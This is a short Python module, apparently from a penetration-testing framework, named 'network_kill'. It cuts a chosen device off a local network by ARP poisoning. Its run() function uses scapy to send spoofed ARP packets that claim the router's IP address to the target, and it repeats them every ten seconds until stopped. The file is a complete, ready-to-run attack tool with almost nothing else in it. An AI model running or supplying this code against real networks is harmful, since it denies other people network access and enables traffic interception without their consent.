#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

from optparse import OptionParser
import os
import signal
from time import sleep
import logging
from scapy.all import *
from collections import OrderedDict
from core import colors
from core import network_scanner

conf = {
	"name": "network_kill",
	"version": "1.0",
	"shortdesc": "\"kicks\" out target device from network with arp calls",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "24.2.2016",
	"needroot": 1
}

# List of variables
variables = OrderedDict((
	('target', ['192.168.1.2', "target device's ip"]),
	('router', ['192.168.1.1', "router's ip"]),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this will not work alway because some devices can refuse from arp request!"+colors.end

#custom commands
customcommands = {
	'scan': 'scan for targets'
}

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.blue + "[*] arp poisoning has been started!" + colors.end)
	print(colors.blue + "[*] ctrl + c to end" + colors.end)
	packet = ARP()
	packet.psrc = variables['router'][0]
	packet.pdst = variables['target'][0]
	while 1:
		send(packet, verbose=False)
		sleep(10)

def scan(args):
	network_scanner.scan()